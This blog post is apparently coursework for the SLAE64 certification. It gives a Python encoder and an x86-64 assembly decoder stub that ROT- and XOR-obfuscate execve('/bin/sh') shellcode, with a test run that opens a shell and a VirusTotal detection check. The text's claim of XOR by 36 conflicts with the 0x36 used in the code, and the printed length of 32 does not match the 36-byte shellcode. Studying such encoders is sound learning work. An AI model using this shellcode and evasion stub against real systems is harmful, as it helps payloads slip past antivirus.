---
title: SLAE64 - Assignment 4 - Custom Insertion Encoder
author: fwinsnes
date: 2021-01-25 13:44:00 +0800
categories: [SLAE64]
tags: [assembly, shellcoding]
---


#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close 
look at a Custom Encoder. 

The fourth assignment from the seven requires the creation of a Custom Encoder, similar to the one shown in the course as the "Insertion Encoder". This should be written in the 
Assembly language, and converting such into [shellcode](https://es.wikipedia.org/wiki/Shellcode). Moreover, it is required that such is tested later on the C format.

##### The Encoder

As for the encoder itself, I have chosen to combine to simple techniques: ROT & XOR encoding. This encoder will:

+ Perform a positive ROT operation "shifting the bytes forward", 24 times.
+ XOR all bytes by 36.

#### The Decoder

The decoder follows an interesting procedure:

+ Performs a negative ROT operation "shifting the bytes backwards", 24 times.
+ XORs all bytes by 36. However, this will be done through the MMX registers.

#### The encoder

```term
#!/usr/bin/python

shellcode = (
"\x48\x31\xc0\x48\x31\xf6\x48\x31\xdb\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
)

encoded = ""
encoded2 = ""

rot = 24

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :

                                y = x^0x36
                                z = (y + rot)%256

                                encoded += '\\x'
                                encoded += '%02x' % z

                                encoded2 += '0x'
                                encoded2 += '%02x,' % z


print '"' + encoded + '"'

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
```

#### Final code

```term
global _start

_start:

      jmp short master       ; Jumps to function "master".

main:

      pop rbp                ; Pops the value to use when XORing in RBP.

      lea rdi, [rbp + 8]     ; Points to the shellcode.

      xor rcx, rcx           ; Zeroes out RCX.
      mov cl, bytes_length   ; Gives cl the length of the shellcode. This sets a counter.

rot:

      sub byte [rdi], 24     ; Negatively rotates RDI by 24.
      inc rdi                ; Increments RDI.
      loop rot               ; Loops this process.

      lea rdi, [rbp + 8]     ; Points to the shellcode.

      xor rcx, rcx           ; Zeroes out RCX.
      mov cl, 5              ; Gives cl the length of the shellcode. As the following operation will be done from 8-bytes in 8-bytes, it isn't required to specify the complete 
                             ; length of the shellcode.

xor:

       movq mm0, qword [rbp] ; Saves QWORD RBP into MM0.
       movq mm1, qword [rdi] ; Saves QWORD RDI into MM1.

       pxor mm0, mm1         ; XORs MM0 and MM1.

       movq qword [rdi], mm0 ; Saves the value of MM0 (XORed piece of shellcode) into RDI (stores original shellcode).
       add rdi, 8            ; Adds 8 to RDI in order to continue with the process.

       loop xor              ; Loops this process.

       jmp bytes             ; Jumps to the original shellcode.

master:

      call main
      value: db 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36
      bytes: db 0x96,0x1f,0x0e,0x96,0x1f,0xd8,0x96,0x1f,0x05,0x7e,0x96,0xa5,0x31,0x31,0x6c,0x77,0x70,0x31,0x5d,0x76,0x7d,0x96,0xd7,0xe9,0x7e,0x96,0xd7,0xec,0x79,0x96,0xd7,0xe8,0x9e,0x25,0x51,0x4b
      bytes_length equ $-bytes
```

#### EndGame

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_4$ gcc rot-mmx_xor.c -o rot-mmx_xor -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_4$ ./rot-mmx_xor 
Shellcode Length:  32
$
```

#### Extra bits

For the sake of curiosity, I chose to submit this file within [VirusTotal.com](http://virustotal.com) and find out the rate of detection. Interestly enough, this caught me off 
guard!

![](/assets/img/SLAE/SLAE64/1.png)

###### Hash: b474e66209c6f09c59b5e33780a1a94c2dce9b82857cff2b0c65eb233bc0508c

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_4).
